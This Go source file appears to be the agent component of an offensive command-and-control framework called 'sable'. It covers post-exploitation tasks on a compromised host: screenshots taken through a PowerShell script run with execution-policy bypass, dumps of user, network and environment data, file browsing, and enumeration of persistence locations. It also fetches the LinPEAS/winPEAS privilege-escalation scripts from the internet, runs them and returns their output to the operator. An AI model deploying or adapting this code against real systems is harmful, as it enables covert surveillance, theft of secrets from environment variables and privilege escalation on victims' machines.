package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

var backgroundTasks sync.Map

const (
	situationalTimeout        = 20 * time.Second
	maxSituationalOutputBytes = 48 * 1024
	maxScreenshotBytes        = 512 * 1024
	peasTimeout               = 10 * time.Minute
	maxPEASToolBytes          = 5 * 1024 * 1024
	maxPEASOutputBytes        = 8 * 1024 * 1024
)

const (
	linPEASURL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
	winPEASURL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat"
)

type fileArtifactResult struct {
	MIME     string `json:"mime"`
	Filename string `json:"filename"`
	Data     string `json:"data"`
}

type cappedBuffer struct {
	buf       bytes.Buffer
	limit     int
	truncated bool
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	if b.limit <= 0 {
		b.truncated = true
		return len(p), nil
	}
	remaining := b.limit - b.buf.Len()
	if remaining <= 0 {
		b.truncated = true
		return len(p), nil
	}
	if len(p) > remaining {
		b.buf.Write(p[:remaining]) //nolint:errcheck
		b.truncated = true
		return len(p), nil
	}
	return b.buf.Write(p)
}

func encodeTextArtifact(filename, text string) (string, string) {
	result := fileArtifactResult{
		MIME:     "text/plain; charset=utf-8",
		Filename: filename,
		Data:     base64.StdEncoding.EncodeToString([]byte(text)),
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

func runReadOnlyCommand(timeout time.Duration, name string, args ...string) (string, string) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, name, args...)
	var out cappedBuffer
	out.limit = maxSituationalOutputBytes
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	text := strings.TrimRight(out.buf.String(), "\r\n")
	if out.truncated {
		text += fmt.Sprintf("\n[output truncated at %d bytes]", maxSituationalOutputBytes)
	}
	if ctx.Err() == context.DeadlineExceeded {
		return text, "command timed out"
	}
	if err != nil {
		return text, err.Error()
	}
	return text, ""
}

func listProcesses() (string, string) {
	switch runtime.GOOS {
	case "windows":
		return runReadOnlyCommand(situationalTimeout, "tasklist.exe", "/FO", "CSV", "/V")
	case "darwin":
		return runReadOnlyCommand(situationalTimeout, "ps", "-axo", "pid,ppid,user,stat,comm,args")
	default:
		return runReadOnlyCommand(situationalTimeout, "ps", "-eo", "pid,ppid,user,stat,comm,args", "--sort=pid")
	}
}

func captureScreenshot() (string, string) {
	var data []byte
	var err error

	switch runtime.GOOS {
	case "windows":
		data, err = captureScreenshotWindows()
	case "darwin":
		data, err = captureScreenshotDarwin()
	default:
		data, err = captureScreenshotLinux()
	}
	if err != nil {
		return "", err.Error()
	}
	if len(data) == 0 {
		return "", "screenshot command returned no image data"
	}
	if len(data) > maxScreenshotBytes {
		return "", fmt.Sprintf("screenshot exceeds bounded limit: %d bytes (max %d)", len(data), maxScreenshotBytes)
	}
	mime, ext := detectImageType(data)

	result := fileArtifactResult{
		MIME:     mime,
		Filename: "screenshot_" + time.Now().UTC().Format("20060102_150405") + ext,
		Data:     base64.StdEncoding.EncodeToString(data),
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

func startPEASTask(taskID string) *protocol.TaskResult {
	plan, err := peasPlan()
	if err != nil {
		return &protocol.TaskResult{TaskID: taskID, Type: "peas", Error: err.Error()}
	}

	atomic.AddInt32(&backgroundTaskCount, 1)
	ctx, cancel := context.WithCancel(context.Background())
	backgroundTasks.Store(taskID, cancel)
	go func() {
		defer backgroundTasks.Delete(taskID)
		defer atomic.AddInt32(&backgroundTaskCount, -1)
		runPEASWithProgress(ctx, taskID, plan)
	}()

	return &protocol.TaskResult{
		TaskID: taskID + "-peas-started",
		Type:   "peas_progress",
		Output: fmt.Sprintf("[peas] %s selected for %s/%s. Background execution started.", plan.name, runtime.GOOS, runtime.GOARCH),
	}
}

func runPEASWithProgress(ctx context.Context, taskID string, plan *peasExecutionPlan) {
	output, taskErr := runPEAS(ctx, plan, func(message string) {
		queueAsyncProgress(taskID, message)
	})
	if taskErr != "" {
		queueAsyncProgress(taskID, "[peas] failed: "+taskErr)
		queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "peas", Error: taskErr, Output: output})
		return
	}
	queueAsyncProgress(taskID, "[peas] text artifact ready; Save Output will appear next")
	queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "peas", Output: output})
}

func runPEAS(parent context.Context, plan *peasExecutionPlan, progress func(string)) (string, string) {
	tmpDir, err := os.MkdirTemp("", "sable-peas-*")
	if err != nil {
		return "", err.Error()
	}
	defer os.RemoveAll(tmpDir) //nolint:errcheck

	toolPath := filepath.Join(tmpDir, plan.filename)
	progress(fmt.Sprintf("[peas] downloading %s from %s", plan.name, plan.url))
	if err := downloadPEASTool(parent, plan.url, toolPath); err != nil {
		return "", err.Error()
	}
	progress(fmt.Sprintf("[peas] download complete: %s", plan.filename))
	if runtime.GOOS != "windows" {
		if err := os.Chmod(toolPath, 0700); err != nil {
			return "", err.Error()
		}
	}

	progress(fmt.Sprintf("[peas] executing %s; output is being captured", plan.name))
	output, taskErr := executePEASTool(parent, plan, toolPath, progress)
	if taskErr != "" {
		output = strings.TrimRight(output, "\r\n") + "\n[runner error] " + taskErr + "\n"
	}
	if strings.TrimSpace(output) == "" {
		output = "[no output captured]\n"
	}

	progress("[peas] execution finished; preparing text artifact")
	return encodeTextArtifact(plan.outputFilename, output)
}

func cancelBackgroundTask(taskID string) (string, string) {
	value, ok := backgroundTasks.Load(taskID)
	if !ok {
		return "", "no running background task with id " + taskID
	}
	cancel, ok := value.(context.CancelFunc)
	if !ok {
		return "", "background task cancellation unavailable"
	}
	cancel()
	return "cancellation requested for " + taskID, ""
}

type peasExecutionPlan struct {
	name           string
	url            string
	filename       string
	outputFilename string
	command        string
	args           []string
}

func peasPlan() (*peasExecutionPlan, error) {
	ts := time.Now().UTC().Format("20060102_150405")
	switch runtime.GOOS {
	case "windows":
		return &peasExecutionPlan{
			name:           "winPEAS",
			url:            winPEASURL,
			filename:       "winPEAS.bat",
			outputFilename: "winpeas_" + ts + ".txt",
			command:        "cmd.exe",
			args:           []string{"/C"},
		}, nil
	case "linux":
		return &peasExecutionPlan{
			name:           "LinPEAS",
			url:            linPEASURL,
			filename:       "linpeas.sh",
			outputFilename: "linpeas_" + ts + ".txt",
			command:        "/bin/sh",
		}, nil
	case "darwin":
		return &peasExecutionPlan{
			name:           "LinPEAS",
			url:            linPEASURL,
			filename:       "linpeas.sh",
			outputFilename: "linpeas_darwin_" + ts + ".txt",
			command:        "/bin/sh",
		}, nil
	default:
		return nil, fmt.Errorf("PEAS is not configured for %s", runtime.GOOS)
	}
}

func downloadPEASTool(parent context.Context, url, dst string) error {
	ctx, cancel := context.WithTimeout(parent, situationalTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("download PEAS: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download PEAS: server returned %d", resp.StatusCode)
	}

	data, err := io.ReadAll(io.LimitReader(resp.Body, maxPEASToolBytes+1))
	if err != nil {
		return fmt.Errorf("read PEAS download: %w", err)
	}
	if len(data) > maxPEASToolBytes {
		return fmt.Errorf("PEAS download exceeds limit of %d bytes", maxPEASToolBytes)
	}
	if len(data) == 0 {
		return fmt.Errorf("PEAS download returned empty body")
	}
	if err := os.WriteFile(dst, data, 0600); err != nil {
		return fmt.Errorf("write PEAS tool: %w", err)
	}
	return nil
}

func executePEASTool(parent context.Context, plan *peasExecutionPlan, toolPath string, progress func(string)) (string, string) {
	ctx, cancel := context.WithTimeout(parent, peasTimeout)
	defer cancel()

	args := append([]string{}, plan.args...)
	args = append(args, toolPath)
	cmd := exec.CommandContext(ctx, plan.command, args...)

	var out cappedBuffer
	out.limit = maxPEASOutputBytes
	cmd.Stdout = &out
	cmd.Stderr = &out

	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	var err error
	started := time.Now()
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case err = <-done:
			progress(fmt.Sprintf("[peas] %s process exited after %s", plan.name, time.Since(started).Round(time.Second)))
			goto finished
		case <-ticker.C:
			progress(fmt.Sprintf("[peas] %s still running for %s", plan.name, time.Since(started).Round(time.Second)))
		case <-ctx.Done():
			err = ctx.Err()
			<-done
			goto finished
		}
	}

finished:
	text := strings.TrimRight(out.buf.String(), "\r\n")
	if out.truncated {
		text += fmt.Sprintf("\n[output truncated at %d bytes]", maxPEASOutputBytes)
	}
	header := fmt.Sprintf("%s output collected at %s\nSource: %s\n\n", plan.name, time.Now().Format(time.RFC3339), plan.url)
	text = header + text
	if ctx.Err() == context.DeadlineExceeded {
		return text, "PEAS timed out"
	}
	if ctx.Err() == context.Canceled {
		return text, "PEAS cancelled"
	}
	if err != nil {
		return text, err.Error()
	}
	return text, ""
}

func hostSnapshot() (string, string) {
	var b strings.Builder
	fmt.Fprintf(&b, "Host snapshot for %s/%s\nCollected at %s\n\n", runtime.GOOS, runtime.GOARCH, time.Now().Format(time.RFC3339))
	appendCommandPlan(&b, "Current user", currentUserCommand())
	appendCommandPlan(&b, "Network interfaces", networkCommand())
	appendCommandPlan(&b, "Routes", routesCommand())
	appendCommandPlan(&b, "Disk", diskCommand())
	appendCommandPlan(&b, "Environment", envCommand())
	return encodeTextArtifact("host_snapshot_"+time.Now().UTC().Format("20060102_150405")+".txt", b.String())
}

func appendCommandPlan(b *strings.Builder, title string, command []string) {
	if len(command) == 0 {
		fmt.Fprintf(b, "\n== %s ==\n(no command)\n", title)
		return
	}
	appendCommandSection(b, title, command[0], command[1:]...)
}

func currentUserCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"whoami.exe", "/all"}
	}
	return []string{"id"}
}

func networkCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"ipconfig.exe", "/all"}
	}
	return []string{"sh", "-c", "ip addr 2>/dev/null || ifconfig -a"}
}

func routesCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"route.exe", "print"}
	}
	return []string{"sh", "-c", "ip route 2>/dev/null || netstat -rn"}
}

func diskCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "Get-PSDrive -PSProvider FileSystem | Format-Table -AutoSize | Out-String -Width 220"}
	}
	return []string{"df", "-h"}
}

func envCommand() []string {
	if runtime.GOOS == "windows" {
		return []string{"cmd.exe", "/C", "set"}
	}
	return []string{"env"}
}

func listDirectory(path string) (string, string) {
	input := strings.TrimSpace(path)
	if input == "" {
		input = "."
	}
	absPath, err := filepath.Abs(input)
	if err != nil {
		return "", err.Error()
	}
	entries, err := os.ReadDir(absPath)
	if err != nil {
		return "", err.Error()
	}

	result := fileBrowserResult{
		Path:      absPath,
		Parent:    parentDirectory(absPath),
		Separator: string(os.PathSeparator),
		Entries:   make([]fileBrowserEntry, 0, len(entries)),
	}
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			result.Entries = append(result.Entries, fileBrowserEntry{
				Name:  entry.Name(),
				Path:  filepath.Join(absPath, entry.Name()),
				Error: err.Error(),
			})
			continue
		}
		result.Entries = append(result.Entries, fileBrowserEntry{
			Name:    entry.Name(),
			Path:    filepath.Join(absPath, entry.Name()),
			IsDir:   entry.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Format(time.RFC3339),
		})
	}
	sort.SliceStable(result.Entries, func(i, j int) bool {
		if result.Entries[i].IsDir != result.Entries[j].IsDir {
			return result.Entries[i].IsDir
		}
		return strings.ToLower(result.Entries[i].Name) < strings.ToLower(result.Entries[j].Name)
	})

	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

type fileBrowserResult struct {
	Path      string             `json:"path"`
	Parent    string             `json:"parent,omitempty"`
	Separator string             `json:"separator"`
	Entries   []fileBrowserEntry `json:"entries"`
}

type fileBrowserEntry struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	IsDir   bool   `json:"is_dir"`
	Size    int64  `json:"size"`
	ModTime string `json:"mod_time,omitempty"`
	Error   string `json:"error,omitempty"`
}

func parentDirectory(path string) string {
	parent := filepath.Dir(path)
	if parent == path || parent == "." {
		return ""
	}
	return parent
}

func captureScreenshotWindows() ([]byte, error) {
	limit := fmt.Sprintf("%d", maxScreenshotBytes)
	script := `
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$limit = ` + limit + `
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
if ($bounds.Width -le 0 -or $bounds.Height -le 0) { throw 'primary screen unavailable' }
$src = New-Object System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($src)
try {
  $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
  $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
  $widths = @(1280, 1024, 800, 640, 480)
  $qualities = @(55, 40, 30, 22, 16)
  foreach ($width in $widths) {
    $scale = [Math]::Min(1.0, $width / [double]$src.Width)
    $newWidth = [Math]::Max(1, [int]($src.Width * $scale))
    $newHeight = [Math]::Max(1, [int]($src.Height * $scale))
    $dst = New-Object System.Drawing.Bitmap -ArgumentList $newWidth, $newHeight
    $draw = [System.Drawing.Graphics]::FromImage($dst)
    try {
      $draw.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
      $draw.DrawImage($src, 0, 0, $newWidth, $newHeight)
      foreach ($quality in $qualities) {
        $params = New-Object System.Drawing.Imaging.EncoderParameters -ArgumentList 1
        $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter -ArgumentList ([System.Drawing.Imaging.Encoder]::Quality), ([int64]$quality)
        $ms = New-Object System.IO.MemoryStream
        try {
          $dst.Save($ms, $codec, $params)
          $bytes = $ms.ToArray()
          if ($bytes.Length -le $limit) {
            [Convert]::ToBase64String($bytes)
            return
          }
        } finally {
          $ms.Dispose()
          $params.Dispose()
        }
      }
    } finally {
      $draw.Dispose()
      $dst.Dispose()
    }
  }
  throw "screenshot exceeds bounded limit of $limit bytes"
} finally {
  $graphics.Dispose()
  $src.Dispose()
}
`
	out, taskErr := runReadOnlyCommand(situationalTimeout, "powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script)
	if taskErr != "" {
		if strings.TrimSpace(out) != "" {
			return nil, fmt.Errorf("%s: %s", taskErr, strings.TrimSpace(out))
		}
		return nil, fmt.Errorf("%s", taskErr)
	}
	return base64.StdEncoding.DecodeString(strings.TrimSpace(out))
}

func detectImageType(data []byte) (string, string) {
	if len(data) >= 3 && data[0] == 0xff && data[1] == 0xd8 && data[2] == 0xff {
		return "image/jpeg", ".jpg"
	}
	if len(data) >= 8 &&
		data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4e && data[3] == 0x47 &&
		data[4] == 0x0d && data[5] == 0x0a && data[6] == 0x1a && data[7] == 0x0a {
		return "image/png", ".png"
	}
	return "application/octet-stream", ".bin"
}

func captureScreenshotDarwin() ([]byte, error) {
	path := filepath.Join(os.TempDir(), fmt.Sprintf("sable_screenshot_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(path) //nolint:errcheck

	if _, err := exec.LookPath("screencapture"); err != nil {
		return nil, fmt.Errorf("screencapture not available")
	}
	if out, taskErr := runReadOnlyCommand(situationalTimeout, "screencapture", "-x", "-t", "jpg", path); taskErr != "" {
		return nil, fmt.Errorf("%s: %s", taskErr, out)
	}
	if _, err := exec.LookPath("sips"); err == nil {
		runReadOnlyCommand(situationalTimeout, "sips", "-Z", "800", path) //nolint:errcheck
	}
	return os.ReadFile(path)
}

func captureScreenshotLinux() ([]byte, error) {
	path := filepath.Join(os.TempDir(), fmt.Sprintf("sable_screenshot_%d.jpg", time.Now().UnixNano()))
	defer os.Remove(path) //nolint:errcheck

	candidates := [][]string{
		{"gnome-screenshot", "-f", path},
		{"grim", path},
		{"maim", path},
		{"import", "-window", "root", path},
	}
	for _, candidate := range candidates {
		if _, err := exec.LookPath(candidate[0]); err != nil {
			continue
		}
		if out, taskErr := runReadOnlyCommand(situationalTimeout, candidate[0], candidate[1:]...); taskErr != "" {
			continue
		} else if strings.TrimSpace(out) != "" {
			// Some tools print warnings on success; keep the image result authoritative.
		}
		data, err := os.ReadFile(path)
		if err == nil && len(data) > 0 {
			return data, nil
		}
	}
	return nil, fmt.Errorf("no supported screenshot utility found")
}

func detectPersistence() (string, string) {
	var b strings.Builder
	fmt.Fprintf(&b, "Common persistence locations for %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Fprintf(&b, "Collected read-only at %s\n", time.Now().Format(time.RFC3339))

	switch runtime.GOOS {
	case "windows":
		appendWindowsPersistence(&b)
	case "darwin":
		appendDarwinPersistence(&b)
	default:
		appendLinuxPersistence(&b)
	}

	text := b.String()
	if len(text) > maxSituationalOutputBytes {
		text = text[:maxSituationalOutputBytes] + fmt.Sprintf("\n[output truncated at %d bytes]", maxSituationalOutputBytes)
	}
	return strings.TrimRight(text, "\r\n"), ""
}

func appendWindowsPersistence(b *strings.Builder) {
	keys := []string{
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
	}
	for _, key := range keys {
		appendCommandSection(b, "Registry "+key, "reg.exe", "query", key)
	}

	appendPathSection(b, "Current user startup folder", filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`))
	appendPathSection(b, "All users startup folder", filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\Startup`))
	appendCommandSection(b, "Enabled scheduled tasks", "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", `Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskPath,TaskName,State | Format-Table -AutoSize | Out-String -Width 220`)
	appendCommandSection(b, "Auto-start services", "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", `Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq 'Auto'} | Select-Object Name,State,StartName,PathName | Format-Table -AutoSize | Out-String -Width 220`)
}

func appendLinuxPersistence(b *strings.Builder) {
	home, _ := os.UserHomeDir()
	paths := []struct {
		title string
		path  string
	}{
		{"Systemd system units", "/etc/systemd/system"},
		{"Systemd user units", filepath.Join(home, ".config/systemd/user")},
		{"Cron.d", "/etc/cron.d"},
		{"Cron hourly", "/etc/cron.hourly"},
		{"Cron daily", "/etc/cron.daily"},
		{"Init.d", "/etc/init.d"},
		{"XDG autostart", "/etc/xdg/autostart"},
		{"User autostart", filepath.Join(home, ".config/autostart")},
		{"rc.local", "/etc/rc.local"},
	}
	for _, p := range paths {
		appendPathSection(b, p.title, p.path)
	}
	appendCommandSection(b, "Current user crontab", "crontab", "-l")
	appendCommandSection(b, "Enabled systemd services", "systemctl", "list-unit-files", "--type=service", "--state=enabled", "--no-pager", "--no-legend")
	appendCommandSection(b, "Enabled systemd timers", "systemctl", "list-unit-files", "--type=timer", "--state=enabled", "--no-pager", "--no-legend")
}

func appendDarwinPersistence(b *strings.Builder) {
	home, _ := os.UserHomeDir()
	paths := []struct {
		title string
		path  string
	}{
		{"System LaunchAgents", "/Library/LaunchAgents"},
		{"System LaunchDaemons", "/Library/LaunchDaemons"},
		{"User LaunchAgents", filepath.Join(home, "Library/LaunchAgents")},
		{"Global StartupItems", "/Library/StartupItems"},
		{"User Login Items plist", filepath.Join(home, "Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm")},
	}
	for _, p := range paths {
		appendPathSection(b, p.title, p.path)
	}
	appendCommandSection(b, "Current user crontab", "crontab", "-l")
}

func appendCommandSection(b *strings.Builder, title, name string, args ...string) {
	out, taskErr := runReadOnlyCommand(situationalTimeout, name, args...)
	fmt.Fprintf(b, "\n== %s ==\n", title)
	if strings.TrimSpace(out) != "" {
		fmt.Fprintf(b, "%s\n", strings.TrimRight(out, "\r\n"))
	}
	if taskErr != "" {
		fmt.Fprintf(b, "[%s]\n", taskErr)
	}
	if strings.TrimSpace(out) == "" && taskErr == "" {
		fmt.Fprintln(b, "(no entries)")
	}
}

func appendPathSection(b *strings.Builder, title, path string) {
	fmt.Fprintf(b, "\n== %s ==\n%s\n", title, path)
	if strings.TrimSpace(path) == "" {
		fmt.Fprintln(b, "(path unavailable)")
		return
	}
	info, err := os.Stat(path)
	if err != nil {
		fmt.Fprintf(b, "[%s]\n", err)
		return
	}
	if !info.IsDir() {
		fmt.Fprintf(b, "file exists (%d bytes)\n", info.Size())
		return
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		fmt.Fprintf(b, "[%s]\n", err)
		return
	}
	if len(entries) == 0 {
		fmt.Fprintln(b, "(empty)")
		return
	}
	names := make([]string, 0, len(entries))
	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += string(os.PathSeparator)
		}
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		fmt.Fprintf(b, "%s\n", name)
	}
}
